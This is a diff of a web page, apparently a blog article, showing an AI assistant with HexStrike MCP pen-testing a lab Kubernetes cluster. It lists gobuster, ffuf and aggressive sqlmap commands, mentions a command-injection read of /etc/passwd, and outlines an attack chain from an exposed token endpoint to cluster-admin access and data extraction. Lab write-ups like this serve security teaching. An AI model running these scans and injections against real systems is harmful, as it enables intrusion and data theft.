 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="how-ai-handles-problems">How AI Handles Problems<a href="#how-ai-handles-problems" class="hash-link" aria-label="Direct link to How AI Handles Problems" title="Direct link to How AI Handles Problems" translate="no">​</a></h3>
 <p>The AI doesn’t give up when something fails. It reasons through problems and finds solutions:</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="problem-1-tool-not-available">Problem 1: Tool Not Available<a href="#problem-1-tool-not-available" class="hash-link" aria-label="Direct link to Problem 1: Tool Not Available" title="Direct link to Problem 1: Tool Not Available" translate="no">​</a></h3>
-<p><strong>Scenario</strong>: AI tries to use<code>feroxbuster</code>but it&#x27;s not installed.</p>
+<p><strong>Scenario</strong>: AI tries to use <code>feroxbuster</code> but it&#x27;s not installed.</p>
 <p><strong>AI Reasoning</strong>:</p>
 <p>&gt; “feroxbuster is not available. I have options:</p>
 <ul>
@@ -580,7 +580,7 @@
 </ul>
 <p>&gt; I’ll use gobuster and ffuf instead. Multiple tools provide redundancy.”</p>
 <p><strong>AI Solution</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Use alternative tools</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Multiple directory enumeration tools provide redundancy</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Use gobuster</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">gobuster dir -u http:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">//</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">49.2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">30080</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -w wordlist.txt</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Use ffuf</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ffuf -u http:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">//</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">49.2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">30080</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/FUZZ -w wordlist.txt</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Use alternative tools</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Multiple directory enumeration tools provide redundancy</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Use gobuster</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">gobuster dir -u http://192.168.49.2:30080 -w wordlist.txt</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Use ffuf</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ffuf -u http://192.168.49.2:30080/FUZZ -w wordlist.txt</span><br></div></code></pre></div></div>
 <p><strong>AI Learning</strong>: “Tool availability issues can be solved by using alternative tools. Having multiple tools is important.”</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="problem-2-wordlist-not-found">Problem 2: Wordlist Not Found<a href="#problem-2-wordlist-not-found" class="hash-link" aria-label="Direct link to Problem 2: Wordlist Not Found" title="Direct link to Problem 2: Wordlist Not Found" translate="no">​</a></h3>
 <p><strong>Scenario</strong>: gobuster can’t find wordlist file.</p>
@@ -602,252 +602,26 @@
 </ul>
 <p>&gt; I’ll try default wordlist first, then skip if needed. Directory enumeration is nice-to-have, not critical.”</p>
 <p><strong>AI Solution</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Try without wordlist or use default</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Directory enumeration is supplementary, not critical</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">gobuster </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">dir</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -u http://192.168.49.2:30080</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Or skip and continue with other tests</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Try without wordlist or use default</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Directory enumeration is supplementary, not critical</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">gobuster dir -u http://192.168.49.2:30080</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Or skip and continue with other tests</span><br></div></code></pre></div></div>
 <p><strong>AI Learning</strong>: “Not all tools are critical. I can continue testing even if some tools fail.”</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="problem-3-sqlmap-interactive-prompt">Problem 3: SQLMap Interactive Prompt<a href="#problem-3-sqlmap-interactive-prompt" class="hash-link" aria-label="Direct link to Problem 3: SQLMap Interactive Prompt" title="Direct link to Problem 3: SQLMap Interactive Prompt" translate="no">​</a></h3>
 <p><strong>Scenario</strong>: SQLMap asks “do you want to exploit this SQL injection? [Y/n]”</p>
 <p><strong>AI Reasoning</strong>:</p>
 <p>&gt; “SQLMap is asking for confirmation. I need to use --batch flag for non-interactive mode. This is a common issue with automated tools.&quot;</p>
 <p><strong>AI Solution</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Add --batch flag</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Need non-interactive mode for automation</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;http://192.168.49.2:30080/?username=test&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --batch --level=3 --risk=3</span><br></div></code></pre></div></div>
-<p><strong>AI Learning</strong>: “Always use non-interactive flags (<code>--batch</code>,<code>-y</code>, etc.) for automated tools.&quot;</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Add --batch flag</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Need non-interactive mode for automation</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://192.168.49.2:30080/?username=test&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --batch --level=3 --risk=3</span><br></div></code></pre></div></div>
+<p><strong>AI Learning</strong>: “Always use non-interactive flags (<code>--batch</code>, <code>-y</code>, etc.) for automated tools.&quot;</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="problem-4-file-naming-issues">Problem 4: File Naming Issues<a href="#problem-4-file-naming-issues" class="hash-link" aria-label="Direct link to Problem 4: File Naming Issues" title="Direct link to Problem 4: File Naming Issues" translate="no">​</a></h3>
 <p><strong>Scenario</strong>: Command injection payload with special characters causes file naming errors.</p>
 <p><strong>AI Reasoning</strong>:</p>
 <p>&gt; “Special characters in payloads (like / in cat /etc/passwd ) cause file naming issues. I need to sanitize filenames or use different approach.&quot;</p>
 <p><strong>AI Solution</strong>:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Sanitize filenames</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Special characters break file operations</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">payload_safe=$(</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">echo</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$payload</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> | </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">tr</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27; &#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;_&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> | </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">tr</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;/&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;_&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl ... &gt; </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;results/cmd-injection-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">$payload_safe</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.json&quot;</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain"># AI Decision: Sanitize filenames</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"># Reasoning: Special characters break file operations</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">payload_safe=$(echo &quot;$payload&quot; | tr &#x27; &#x27; &#x27;_&#x27; | tr &#x27;/&#x27; &#x27;_&#x27;)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl ... &gt; &quot;results/cmd-injection-$payload_safe.json&quot;</span><br></div></code></pre></div></div>
 <p><strong>AI Learning</strong>: “Always sanitize user input, even when it’s from my own payloads.”</p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="complete-attack-chain">Complete Attack Chain<a href="#complete-attack-chain" class="hash-link" aria-label="Direct link to Complete Attack Chain" title="Direct link to Complete Attack Chain" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="single-entry-point-to-full-compromise">Single Entry Point to Full Compromise<a href="#single-entry-point-to-full-compromise" class="hash-link" aria-label="Direct link to Single Entry Point to Full Compromise" title="Direct link to Single Entry Point to Full Compromise" translate="no">​</a></h3>
 <p><strong>AI’s Attack Path</strong>:</p>
-<details class="plain-large-code" data-plain-code-lines="227"><summary>Large code or log block<!-- --> · <!-- -->227<!-- --> lines · expand raw text</summary><button type="button">Copy raw text</button><pre tabindex="0"><code>Stage 0:
- 
-Initial
- 
-Prompt
-    
-↓
-    
-AI Reasoning:
- 
-&quot;I need to discover everything from scratch&quot;
-    
-↓
-Stage 1:
- 
-Network
- 
-Reconnaissance
- 
-(nmap)
-    
-↓
-    
-AI Discovery:
- 
-4
- 
-HTTP
- 
-services
- 
-+
- 
-K8s
- 
-API
-    
-↓
-    
-AI Decision:
- 
-&quot;HTTP services are easier entry points&quot;
-    
-↓
-Stage 2:
- 
-Service
- 
-Discovery
- 
-(httpx,
- 
-nuclei,
- 
-curl)
-    
-↓
-    
-AI Discovery:
- 
-/api/token
- 
-endpoint
- 
-on
- 
-port
- 
-30082
-    
-↓
-    
-AI Decision:
- 
-&quot;This could expose tokens - test immediately&quot;
-    
-↓
-Stage 3:
- 
-Token
- 
-Extraction
- 
-(curl
- 
--
- 
-multiple
- 
-methods)
-    
-↓
-    
-AI Success:
- 
-Token
- 
-extracted
-    
-↓
-    
-AI Decision:
- 
-&quot;Test if token works with K8s API&quot;
-    
-↓
-Stage 4:
- 
-Kubernetes
- 
-API
- 
-Access
- 
-(curl
- 
-+
- 
-token)
-    
-↓
-    
-AI Success:
- 
-Cluster-admin
- 
-access
- 
-confirmed
-    
-↓
-    
-AI Decision:
- 
-&quot;I have cluster access, but user wants MULTIPLE ways&quot;
-    
-↓
-Stage 5:
- 
-Multiple
- 
-Exploitation
- 
-(command
- 
-injection,
- 
-SQL
- 
-injection)
-    
-↓
-    
-AI Success:
- 
-3
- 
-different
- 
-attack
- 
-vectors
- 
-confirmed
-    
-↓
-    
-AI Decision:
- 
-&quot;Enumerate cluster to find all vulnerabilities&quot;
-    
-↓
-Stage 6:
- 
-Cluster
- 
-Enumeration
- 
-(curl
- 
-+
- 
-jq)
-    
-↓
-    
-AI Discovery:
- 
-27
- 
-pods,
- 
-13
- 
-privileged,
- 
-50
- 
-service
- 
-accounts
-    
-↓
-    
-AI Decision:
- 
-&quot;Extract complete cluster state&quot;
-    
-↓
-Stage 7:
- 
-Data
- 
-Extraction
-    
-↓
-    
-AI Success:
- 
-Full
- 
-cluster
- 
-compromise
- 
-documented
-</code></pre></details>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Stage 0: Initial Prompt</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    AI Reasoning: &quot;I need to discover everything from scratch&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Stage 1: Network Reconnaissance (nmap)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    AI Discovery: 4 HTTP services + K8s API</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    AI Decision: &quot;HTTP services are easier entry points&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Stage 2: Service Discovery (httpx, nuclei, curl)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    AI Discovery: /api/token endpoint on port 30082</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    AI Decision: &quot;This could expose tokens - test immediately&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Stage 3: Token Extraction (curl - multiple methods)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    AI Success: Token extracted</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    AI Decision: &quot;Test if token works with K8s API&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Stage 4: Kubernetes API Access (curl + token)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    AI Success: Cluster-admin access confirmed</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    AI Decision: &quot;I have cluster access, but user wants MULTIPLE ways&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Stage 5: Multiple Exploitation (command injection, SQL injection)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    AI Success: 3 different attack vectors confirmed</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    AI Decision: &quot;Enumerate cluster to find all vulnerabilities&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Stage 6: Cluster Enumeration (curl + jq)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    AI Discovery: 27 pods, 13 privileged, 50 service accounts</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    AI Decision: &quot;Extract complete cluster state&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Stage 7: Data Extraction</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    AI Success: Full cluster compromise documented</span><br></div></code></pre></div></div>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="multiple-attack-vectors-discovered">Multiple Attack Vectors Discovered<a href="#multiple-attack-vectors-discovered" class="hash-link" aria-label="Direct link to Multiple Attack Vectors Discovered" title="Direct link to Multiple Attack Vectors Discovered" translate="no">​</a></h2>
 <p><strong>AI’s Findings</strong>:</p>
 <ul>
@@ -855,7 +629,7 @@ documented
 <p><strong>Primary Vector</strong>: Token Exposure → Cluster-Admin Access</p>
 </li>
 <li class="">
-<p>Entry: Port 30082<code>/api/token</code></p>
+<p>Entry: Port 30082 <code>/api/token</code></p>
 </li>
 <li class="">
 <p>Result: Full cluster control</p>
@@ -864,7 +638,7 @@ documented
 <p><strong>2. Secondary Vector</strong>: Command Injection → Container Control</p>
 <ul>
 <li class="">
-<p>Entry: Port 30081<code>/api/execute</code></p>
+<p>Entry: Port 30081 <code>/api/execute</code></p>
 </li>
 <li class="">
 <p>Result: Root RCE, environment variable extraction</p>
@@ -873,7 +647,7 @@ documented
 <p><strong>3. Tertiary Vector</strong>: SQL Injection → Database Access</p>
 <ul>
 <li class="">
-<p>Entry: Port 30080<code>?username=</code></p>
+<p>Entry: Port 30080 <code>?username=</code></p>
 </li>
 <li class="">
 <p>Result: Database compromise potential</p>
@@ -1005,40 +779,40 @@ documented
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-complete-prompt">The Complete Prompt<a href="#the-complete-prompt" class="hash-link" aria-label="Direct link to The Complete Prompt" title="Direct link to The Complete Prompt" translate="no">​</a></h3>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-the-user-actually-types">What the User Actually Types<a href="#what-the-user-actually-types" class="hash-link" aria-label="Direct link to What the User Actually Types" title="Direct link to What the User Actually Types" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Perform a comprehensive black-box penetration test </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">on</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> the Kubernetes cluster at </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.49</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.2</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">. </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">I have zero knowledge about </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">this</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> target. </span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Perform a comprehensive black-box penetration test on the Kubernetes cluster at 192.168.49.2. </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">I have zero knowledge about this target. </span><br></div></code></pre></div></div>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Requirements:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">1. Use HexStrike MCP tools where available</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">2. Find MULTIPLE ways to discover and exploit each vulnerability</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">3. Start from a single entry point and work your way to full cluster compromise</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">4. Document all reasoning, tool usage, and troubleshooting steps</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">5. Test multiple exploitation methods for each vulnerability found</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">6. Use as many tools as possible for comprehensive coverage</span><br></div></code></pre></div></div>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Show me:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">- Why you choose each tool</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">- How you use each tool</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">- What you discover</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">- Multiple ways to exploit each finding</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">- How you troubleshoot problems</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">- Complete attack chain from entry to compromise</span><br></div></code></pre></div></div>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-the-ai-does">What the AI Does<a href="#what-the-ai-does" class="hash-link" aria-label="Direct link to What the AI Does" title="Direct link to What the AI Does" translate="no">​</a></h2>
 <ul>
 <li class="">
-<p><strong>Analyzes the prompt</strong>— Understands requirements</p>
+<p><strong>Analyzes the prompt</strong> — Understands requirements</p>
 </li>
 <li class="">
-<p><strong>Plans the attack</strong>— Creates strategy</p>
+<p><strong>Plans the attack</strong> — Creates strategy</p>
 </li>
 <li class="">
-<p><strong>Selects tools</strong>— Reasons about which tools to use</p>
+<p><strong>Selects tools</strong> — Reasons about which tools to use</p>
 </li>
 <li class="">
-<p><strong>Executes tests</strong>— Runs all tools systematically</p>
+<p><strong>Executes tests</strong> — Runs all tools systematically</p>
 </li>
 <li class="">
-<p><strong>Finds vulnerabilities</strong>— Discovers multiple issues</p>
+<p><strong>Finds vulnerabilities</strong> — Discovers multiple issues</p>
 </li>
 <li class="">
-<p><strong>Tests multiple methods</strong>— Doesn’t stop at first success</p>
+<p><strong>Tests multiple methods</strong> — Doesn’t stop at first success</p>
 </li>
 <li class="">
-<p><strong>Troubleshoots</strong>— Fixes problems automatically</p>
+<p><strong>Troubleshoots</strong> — Fixes problems automatically</p>
 </li>
 <li class="">
-<p><strong>Documents everything</strong>— Creates comprehensive report</p>
+<p><strong>Documents everything</strong> — Creates comprehensive report</p>
 </li>
 </ul>
 <p><strong>Result</strong>: Complete penetration test from one prompt.</p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="conclusion">Conclusion<a href="#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion" translate="no">​</a></h2>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-power-of-ai--hexstrike-mcp">The Power of AI + HexStrike MCP<a href="#the-power-of-ai--hexstrike-mcp" class="hash-link" aria-label="Direct link to The Power of AI + HexStrike MCP" title="Direct link to The Power of AI + HexStrike MCP" translate="no">​</a></h2>
-<p>This article demonstrates how<strong>one prompt</strong>to an AI assistant with HexStrike MCP can:</p>
+<p>This article demonstrates how <strong>one prompt</strong> to an AI assistant with HexStrike MCP can:</p>
 <ul>
 <li class="">
 <p>Perform complete black-box penetration test</p>
@@ -1059,7 +833,7 @@ documented
 <p>Document everything</p>
 </li>
 </ul>
-<p><strong>Key Takeaway</strong>: AI-powered penetration testing with HexStrike MCP transforms a complex, multi-day manual process into a<strong>single prompt</strong>that completes in minutes.</p>
+<p><strong>Key Takeaway</strong>: AI-powered penetration testing with HexStrike MCP transforms a complex, multi-day manual process into a <strong>single prompt</strong> that completes in minutes.</p>
 <p><strong>Test Results</strong>:</p>
 <ul>
 <li class="">
@@ -1081,6 +855,6 @@ documented
 <p><strong>Proof Files</strong>: 50+ created</p>
 </li>
 </ul>
-<p><strong>Status</strong>:<strong>FULL CLUSTER COMPROMISE ACHIEVED</strong></p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/medium-blog-navigation/docs/articles/2026/2026-02-04-my-lab-82d780962213"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">My lab:</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/medium-blog-navigation/docs/articles/2026/2026-02-05-warning-i-just-built-real-malware-by-using-just-human-language-prompts-8949628dee19"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">⚠️ WARNING: I Just Built Real Malware by using just human language prompts!</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#ecosystem-fit" class="table-of-contents__link toc-highlight">Ecosystem Fit</a><ul><li><a href="#how-cursor--hexstrike-mcp-automatically-discovers-and-exploits-vulnerabilities-from-single-entry-point-to-full-cluster-compromise" class="table-of-contents__link toc-highlight">How Cursor + HexStrike MCP Automatically Discovers and Exploits Vulnerabilities. From single entry point to full cluster compromise</a></li></ul></li><li><a href="#executive-summary" class="table-of-contents__link toc-highlight">Executive Summary</a><ul><li><a href="#the-power-of-one-prompt" class="table-of-contents__link toc-highlight">The Power of One Prompt</a></li></ul></li><li><a href="#table-of-contents" class="table-of-contents__link toc-highlight">Table of Contents</a></li><li><a href="#the-single-prompt" class="table-of-contents__link toc-highlight">The Single Prompt</a><ul><li><a href="#the-initial-request" class="table-of-contents__link toc-highlight">The Initial Request</a></li></ul></li><li><a href="#ai-initial-analysis" class="table-of-contents__link toc-highlight">AI Initial Analysis</a></li><li><a href="#ai-reasoning-and-tool-selection" class="table-of-contents__link toc-highlight">AI Reasoning and Tool Selection</a><ul><li><a href="#how-ai-chooses-tools" class="table-of-contents__link toc-highlight">How AI Chooses Tools</a></li><li><a href="#example-network-reconnaissance" class="table-of-contents__link toc-highlight">Example: Network Reconnaissance</a></li></ul></li><li><a href="#stage-by-stage-execution" class="table-of-contents__link toc-highlight">Stage-by-Stage Execution</a><ul><li><a href="#stage-0-initial-reconnaissance" class="table-of-contents__link toc-highlight">Stage 0: Initial Reconnaissance</a></li><li><a href="#stage-1-service-discovery" class="table-of-contents__link toc-highlight">Stage 1: Service 